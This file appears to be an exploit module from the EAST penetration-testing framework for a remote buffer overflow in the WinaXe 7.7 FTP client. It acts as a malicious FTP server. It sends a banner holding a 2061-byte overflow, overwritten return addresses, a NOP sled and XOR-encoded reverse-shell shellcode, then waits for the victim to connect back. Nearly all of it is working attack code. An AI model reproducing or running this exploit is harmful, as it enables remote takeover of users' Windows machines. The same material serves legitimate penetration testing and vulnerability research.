#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import socket
import struct
from collections import OrderedDict

sys.path.append('./core')
sys.path.append('./shellcodes')
import ShellUtils
import Shellcodes
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_winaxe_ftp_bof_rce"
INFO['DESCRIPTION'] = "WinaXe 7.7 'FTP client' - Remote Buffer Overflow"
INFO['VENDOR'] = "http://www.labf.com"
INFO['DOWNLOAD_LINK'] = 'https://www.exploit-db.com/apps/14a4633750e37743871406a878b3780d-winaxe.exe'
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/40693/']
INFO["CVE Name"] = ''
INFO["NOTES"] = """WinaXe v7.7 FTP client is subject to MULTIPLE remote buffer overflow vectors when connecting to a malicious FTP Server and receiving overly long payloads in the command response from the remote server.
Tested on WINDIWS 7 SP1
"""

INFO['CHANGELOG'] = "08 Nov, 2016. Written by East team"
INFO['PATH'] = 'Exploits/General/'

OPTIONS = OrderedDict()
OPTIONS['CALLBACK_IP'] = socket.gethostbyname(socket.gethostname()), dict(description = 'Callback IP')

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.callback_ip = ''
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.callback_ip = self.args.get('CALLBACK_IP', OPTIONS["CALLBACK_IP"])
    
    def make_sploit(self):
        self.log("[>] Generate shellcode started")
        if self.args['listener']:
            port = self.args['listener']['PORT']
        else:
            self.log('Listener not enabled')
            return None
        
        os_target = ShellUtils.Constants.OS.WINDOWS
        os_target_arch = ShellUtils.Constants.OS_ARCH.X32        
        badchars = ["\x00", "\x0a", "\x0d"]
        shellcode_type = "reverse"
        
        s = Shellcodes.OSShellcodes(os_target, os_target_arch, self.callback_ip, port, badchars)
        shellcode = s.create_shellcode(shellcode_type, encode=ShellUtils.Constants.EncoderType.XOR)
        
        self.log("Length of shellcode: %d" % len(shellcode))
        self.log("[+] Generate shellcode finished")
        
        return shellcode
    
    def run(self):
        self.args()
        self.log('')
                    
        if self.is_listener_connected() is None:
            self.log('Please, enable listener to use this module')
            self.finish(False)
            
        shellcode = self.make_sploit()
        if not shellcode:
            self.log('Shellcode not generated')
            self.finish(False)
            
        eip = struct.pack('<L', 0x68084A6F)     #POP ECX RET 
        jmp_esp = struct.pack('<L', 0x68017296) #JMP ESP
         
        payload = "A" * 2061
        payload += eip
        payload += jmp_esp
        payload += "\x90" * 10
        payload += shellcode
        payload += "\x90" * 20
                          
        s = socket.socket()            
        s.bind((self.callback_ip, 21))            
        s.listen(1)                    
        
        self.log('FTPServer listening...')
        conn, addr = s.accept()     
        conn.send('220' + payload + '\r\n')
        conn.close()   
        
        self.log('Payload sent. Wait for callback connection')
        while True:
            if self.is_listener_connected():
                break
            time.sleep(3)
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()